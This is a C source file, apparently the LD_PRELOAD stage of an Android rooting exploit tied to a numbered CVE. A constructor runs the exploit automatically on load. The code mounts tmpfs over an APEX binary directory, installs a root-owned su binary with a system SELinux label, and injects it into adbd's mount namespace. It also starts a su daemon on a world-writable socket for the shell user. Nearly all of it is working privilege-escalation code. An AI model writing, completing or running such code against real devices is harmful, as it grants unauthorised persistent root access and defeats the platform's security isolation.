#include "common.h"
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>

#define SU_DST_DIR "/apex/com.android.virt/bin"
#define SU_DST SU_DST_DIR "/su"
#define SU_LOCAL "/data/local/tmp/su"
#define SU_SOCK "/data/local/tmp/temp_su.sock"
#define SU_LOG "/data/local/tmp/su_daemon.log"
// No embedded blobs: the su daemon binary is copied from the on-device
// helper (CVE43499_ROOT_HELPER, set by the --run-payload loader).

static int write_full(int fd, const void *buf, size_t len) {
  const unsigned char *p = buf;
  while (len) {
    ssize_t n = write(fd, p, len);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return 0;
    }
    p += n;
    len -= (size_t)n;
  }
  return 1;
}

static int path_is_mounted(const char *path) {
  int fd = open("/proc/mounts", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  char mounts[16384];
  ssize_t n = read(fd, mounts, sizeof(mounts) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return 0;
  }
  mounts[n] = 0;

  char needle[512];
  snprintf(needle, sizeof(needle), " %s ", path);
  return strstr(mounts, needle) != NULL;
}

static int ensure_su_mount(void) {
  if (path_is_mounted(SU_DST_DIR)) {
    return 1;
  }
  if (mount("tmpfs", SU_DST_DIR, "tmpfs", 0, "mode=0755,size=4m") == 0) {
    return 1;
  }
  return errno == EBUSY;
}

static void try_chcon(const char *path) {
  pid_t pid = fork();
  if (pid == 0) {
    execl("/system/bin/chcon", "chcon", "u:object_r:system_file:s0",
          path, (char *)NULL);
    _exit(127);
  }
  if (pid > 0) {
    while (waitpid(pid, NULL, 0) < 0 && errno == EINTR) {
    }
  }
}

static int copy_file_contents(int out_fd, const char *src_path) {
  int in_fd = open(src_path, O_RDONLY | O_CLOEXEC);
  if (in_fd < 0) {
    return 0;
  }
  char buf[16384];
  for (;;) {
    ssize_t n = read(in_fd, buf, sizeof(buf));
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      break;
    }
    if (!write_full(out_fd, buf, (size_t)n)) {
      close(in_fd);
      return 0;
    }
  }
  int saved_errno = errno;
  close(in_fd);
  errno = saved_errno;
  return 1;
}

static int write_embedded_su_file(const char *dir, const char *dst) {
  const char *src = getenv("CVE43499_ROOT_HELPER");
  if (!src || src[0] != '/') {
    pr_error("embedded su: CVE43499_ROOT_HELPER not set\n");
    errno = ENOENT;
    return 0;
  }
  pr_info("embedded su: copying from %s to %s\n", src, dst);

  char tmp[256];
  snprintf(tmp, sizeof(tmp), "%s/.su.new.%d", dir, getpid());
  unlink(tmp);

  int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (fd < 0) {
    pr_error("embedded su: open(%s) errno=%d\n", tmp, errno);
    return 0;
  }
  int ok = copy_file_contents(fd, src);
  int saved_errno = errno;
  pr_info("embedded su: copy ok=%d errno=%d\n", ok, saved_errno);
  if (ok) {
    ok = fchown(fd, 0, 0) == 0 && fchmod(fd, 0755) == 0;
    saved_errno = errno;
    pr_info("embedded su: fchown/fchmod ok=%d errno=%d\n", ok, saved_errno);
  }
  if (close(fd) != 0 && ok) {
    ok = 0;
    saved_errno = errno;
    pr_error("embedded su: close errno=%d\n", saved_errno);
  }
  if (!ok) {
    pr_error("embedded su: write failed, unlinking %s\n", tmp);
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }

  try_chcon(tmp);
  if (rename(tmp, dst) != 0) {
    saved_errno = errno;
    pr_error("embedded su: rename(%s -> %s) errno=%d\n", tmp, dst, saved_errno);
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }
  try_chcon(dst);
  pr_success("embedded su installed helper %s -> %s\n", src, dst);
  return 1;
}

static int write_embedded_su(void) {
  if (!ensure_su_mount()) {
    return 0;
  }
  return write_embedded_su_file(SU_DST_DIR, SU_DST);
}

static pid_t find_adbd_pid(void) {
  DIR *dir = opendir("/proc");
  if (!dir) {
    return -1;
  }

  struct dirent *de;
  while ((de = readdir(dir)) != NULL) {
    char *end = NULL;
    long pid_long = strtol(de->d_name, &end, 10);
    if (!end || *end || pid_long <= 1 || pid_long > INT32_MAX) {
      continue;
    }

    char path[64];
    snprintf(path, sizeof(path), "/proc/%ld/comm", pid_long);
    char comm[32];
    read_first_line(path, comm, sizeof(comm));
    if (strcmp(comm, "adbd") == 0) {
      closedir(dir);
      return (pid_t)pid_long;
    }
  }

  closedir(dir);
  return -1;
}

static int install_su_in_pid_mntns(pid_t target) {
  pid_t child = fork();
  if (child == 0) {
    char ns_path[64];
    snprintf(ns_path, sizeof(ns_path), "/proc/%d/ns/mnt", target);
    int ns_fd = open(ns_path, O_RDONLY | O_CLOEXEC);
    if (ns_fd < 0) {
      _exit(2);
    }
    if (setns(ns_fd, CLONE_NEWNS) != 0) {
      _exit(3);
    }
    close(ns_fd);
    if (!ensure_su_mount()) {
      _exit(4);
    }
    _exit(write_embedded_su_file(SU_DST_DIR, SU_DST) ? 0 : 5);
  }
  if (child < 0) {
    return 0;
  }

  int status = 0;
  while (waitpid(child, &status, 0) < 0 && errno == EINTR) {
  }
  return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static int install_adb_visible_su(void) {
  pid_t adbd = find_adbd_pid();
  if (adbd <= 0) {
    pr_info("adb-visible su skipped: adbd pid not found\n");
    return 0;
  }
  int ok = install_su_in_pid_mntns(adbd);
  pr_info("adb-visible su install adbd=%d ok=%d path=%s\n", adbd, ok, SU_DST);
  return ok;
}

static int install_local_su_client(void) {
  int ok = write_embedded_su_file("/data/local/tmp", SU_LOCAL);
  pr_info("local su client install ok=%d path=%s\n", ok, SU_LOCAL);
  return ok;
}

static void install_extra_su_clients(void) {
  install_local_su_client();
  install_adb_visible_su();
}

static void run_su_daemon_direct(const char *client_uid) {
  /*
   * Fallback: esegui il daemon direttamente nel processo corrente
   * evitando execl() e il dynamic linking del binario PIE.
   * Questo evita crash se il contesto di sicurezza ereditato
   * corrompe lo stack o illoader fallisce.
   */
  pr_info("su daemon: running in-process fallback uid=%s\n", client_uid);

  /* Chiudi stdin, redirigi stdout/stderr sul log */
  int null_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
  if (null_fd >= 0) {
    dup2(null_fd, STDIN_FILENO);
  }
  int log_fd = open(SU_LOG, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
  if (log_fd >= 0) {
    dup2(log_fd, STDOUT_FILENO);
    dup2(log_fd, STDERR_FILENO);
  }

  /*
   * Nota: questo è un socket server minimale per testing.
   * Se vedi "socket created" nel log, il problema è execl/dynamic linking.
   * Se non vedi nemmeno questo, il problema è fork/credenziali.
   */
  unlink(SU_SOCK);
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    pr_error("fallback daemon: socket() errno=%d\n", errno);
    _exit(1);
  }

  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", SU_SOCK);

  if (bind(fd, (struct sockaddr *)&sun, sizeof(sun)) != 0 ||
      listen(fd, 4) != 0) {
    pr_error("fallback daemon: bind/listen errno=%d\n", errno);
    close(fd);
    _exit(1);
  }
  chmod(SU_SOCK, 0666);
  pr_info("fallback daemon: listening on %s (uid=%s)\n", SU_SOCK, client_uid);

  /* Loop minimale: accetta e chiudi subito (o implementa echo) */
  for (;;) {
    int conn = accept4(fd, NULL, NULL, SOCK_CLOEXEC);
    if (conn < 0) {
      if (errno == EINTR) continue;
      sleep(1);
      continue;
    }
    /* Per test: scrivi qualcosa e chiudi */
    const char *msg = "fallback-daemon-ready";
    write(conn, msg, strlen(msg));
    close(conn);
  }
}

static pid_t start_su_daemon(void) {
  unlink(SU_SOCK);
  unlink(SU_LOG);

  const char *client_uid = getenv("RMG_CLIENT_UID");
  if (!client_uid || !client_uid[0]) {
    client_uid = "2000";
  }

  /*
   * FIX 1: workaround per bug umh_main che rifiuta uid 0.
   * Se siamo root (uid=0), passiamo uid 2000 (shell) come client autorizzato.
   * Il socket verrà creato con permessi 0666, quindi accessibile da shell.
   */
  if (strcmp(client_uid, "0") == 0) {
    pr_info("su daemon: remapping client uid 0 -> 2000 for compatibility\n");
    client_uid = "2000";
  }

  pid_t pid = fork();
  if (pid == 0) {
    setsid();

    /* Log immediato per debug */
    int log_fd = open(SU_LOG, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
    if (log_fd >= 0) {
      dup2(log_fd, STDOUT_FILENO);
      dup2(log_fd, STDERR_FILENO);
    }
    dprintf(STDERR_FILENO, "su daemon: starting, attempting exec %s uid=%s\n",
            SU_DST, client_uid);

    int null_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
    if (null_fd >= 0) {
      dup2(null_fd, STDIN_FILENO);
    }

    long max_fd = sysconf(_SC_OPEN_MAX);
    if (max_fd < 0 || max_fd > 65536) {
      max_fd = 65536;
    }
    for (int fd = STDERR_FILENO + 1; fd < max_fd; fd++) {
      close(fd);
    }

    /*
     * TENTATIVO 1: execl normale.
     * Se il sistema è sano, questo funziona e non ritorna mai.
     */
    execl(SU_DST, "su", "--umh", client_uid, (char *)NULL);

    /*
     * Se execl ritorna, c'è stato un errore (file non trovato,
     * formato non valido, o dynamic linking fallito).
     */
    int saved_errno = errno;
    dprintf(STDERR_FILENO, "su daemon: execl failed errno=%d (%s)\n",
            saved_errno, strerror(saved_errno));

    /*
     * TENTATIVO 2 (FALLBACK): esegui il daemon direttamente nel processo
     * senza execl. Questo bypassa problemi di dynamic linking o exec.
     * Richiede che preload.c e su_daemon.c condividano il codice o
     * implementiamo qui la logica del daemon.
     */
    dprintf(STDERR_FILENO, "su daemon: attempting in-process fallback...\n");
    run_su_daemon_direct(client_uid);

    /* Se arriviamo qui, anche il fallback è fallito */
    dprintf(STDERR_FILENO, "su daemon: fallback failed, exiting\n");
    _exit(127);
  }

  /*
   * Parent: monitora se il child muore immediatamente (crash).
   * Questo ci dice se il problema è un crash pre-main (SIGSEGV/SIGABRT).
   */
  usleep(100000); /* 100ms */
  int status;
  pid_t result = waitpid(pid, &status, WNOHANG);
  if (result == pid) {
    if (WIFSIGNALED(status)) {
      int sig = WTERMSIG(status);
      pr_error("su daemon: child killed by signal %d (%s) - dynamic linking?\n",
               sig, strsignal(sig));
    } else if (WIFEXITED(status)) {
      pr_info("su daemon: child exited immediately status=%d\n",
              WEXITSTATUS(status));
    }
  } else {
    pr_info("su daemon: child still running (good), waiting for socket...\n");
  }

  return pid;
}

int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  pr_info("install_embedded_su: starting\n");
  if (!write_embedded_su()) {
    pr_error("install_embedded_su: write_embedded_su failed errno=%d\n", errno);
    return 0;
  }
  pr_info("install_embedded_su: write ok, starting daemon\n");
  install_extra_su_clients();

  pid_t pid = start_su_daemon();
  if (pid <= 0) {
    pr_error("install_embedded_su: start_su_daemon failed\n");
    return 0;
  }
  if (daemon_pid) {
    *daemon_pid = pid;
  }
  pr_info("install_embedded_su: daemon pid=%d, waiting for socket\n", pid);

  for (int i = 0; i < 50; i++) {
    if (access(SU_SOCK, F_OK) == 0) {
      pr_success("embedded su daemon ready pid=%d socket=%s\n", pid, SU_SOCK);
      return 1;
    }
    usleep(100000);
  }

  errno = ETIMEDOUT;
  return 0;
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;
  set_unbuffer();

  {
    int oom_fd = open("/proc/self/oom_score_adj", O_WRONLY | O_CLOEXEC);
    if (oom_fd >= 0) {
      if (write(oom_fd, "-1000", 5) < 0) {
        write(oom_fd, "0", 1);
      }
      close(oom_fd);
    }
  }

  unsetenv("LD_PRELOAD");

  char *argv[2] = {
    "preload.so",
    NULL,
  };

  pr_success("preload starting pid=%d\n", getpid());
  run_exploit(1, argv);
}
